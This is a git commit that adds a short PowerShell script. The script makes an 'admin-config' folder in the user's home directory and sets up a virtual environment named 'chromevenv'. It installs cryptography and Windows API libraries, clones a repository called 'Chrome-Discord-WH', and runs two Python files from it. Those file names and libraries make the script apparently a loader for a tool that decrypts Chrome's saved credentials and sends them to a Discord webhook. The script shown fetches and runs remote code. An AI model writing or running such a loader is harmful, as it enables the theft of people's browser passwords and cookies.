397129a4b7c65b21530f834876701f92bce19951
Ishan Leung <34925387+ishan211@users.noreply.github.com>
2024-11-21 03:00:42 -0500

    Create cp.ps1

---
+++ cp.ps1
@@ -0,0 +1,36 @@
+# Navigate to the user's home directory
+cd $HOME
+
+# Create the 'admin-config' directory if it doesn't already exist
+mkdir admin-config -Force
+
+# Navigate into the 'admin-config' directory
+cd admin-config
+
+# Create a Python virtual environment named 'chromevenv'
+python -m venv chromevenv
+
+# Navigate into the 'chromevenv' directory
+cd chromevenv
+
+# Activate the virtual environment
+.\Scripts\Activate.bat
+
+# Install required Python libraries
+pip install pycryptodomex
+pip install pywin32
+
+# Clone the GitHub repository
+git clone https://github.com/ishan211/Chrome-Discord-WH.git
+
+# Navigate into the cloned repository
+cd Chrome-Discord-WH
+
+# Run d.py
+py d.py
+
+# Wait for 500 milliseconds
+Start-Sleep -Milliseconds 500
+
+# Run s.py
+py s.py
